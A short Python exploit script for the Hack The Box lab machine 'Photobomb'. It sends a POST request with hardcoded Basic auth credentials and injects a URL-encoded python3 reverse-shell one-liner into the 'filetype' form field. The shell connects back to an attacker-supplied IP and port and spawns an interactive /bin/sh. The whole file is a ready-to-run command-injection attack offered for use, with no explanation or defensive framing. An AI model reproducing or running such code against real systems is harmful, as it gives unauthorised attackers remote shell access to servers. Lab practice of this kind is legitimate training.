#!/usr/bin/env python3


from colorama import Fore
import requests,sys,re,colorama
from urllib.parse import urlencode, quote_plus
import urllib




def get_rev_shell():
	try:
		url = "http://photobomb.htb/printer"
		ip = input(Fore.YELLOW + "What Is Your Hackthebox Ip: ")
		p = input(Fore.YELLOW + "What Port Are You Listening On: ")
		payload = (f"python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22{ip}%22%2C{p}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27")
		headers = {"Authorization": "Basic cEgwdDA6YjBNYiE=", "content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}
		data = f"photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;{payload}&dimensions=3000x2000"
		print(Fore.BLUE + "Make Sure To Listen On Your Netcat Port!")
		print(Fore.RED + "Btw Make Sure To Stableize Your Shell!")
		r = requests.post(url, headers=headers, data=data)
	except:
		print(Fore.RED + "SomeThing Fucked Up!")




def __init__():
	try:
		print(Fore.YELLOW + "OPTIONS: rev-shell")
		choice = input(Fore.YELLOW + "Pick An Option Above: ")
		if choice == "rev-shell":
			get_rev_shell()
	except:
		print(Fore.RED + "SomeThing Fucked Up!")


__init__()
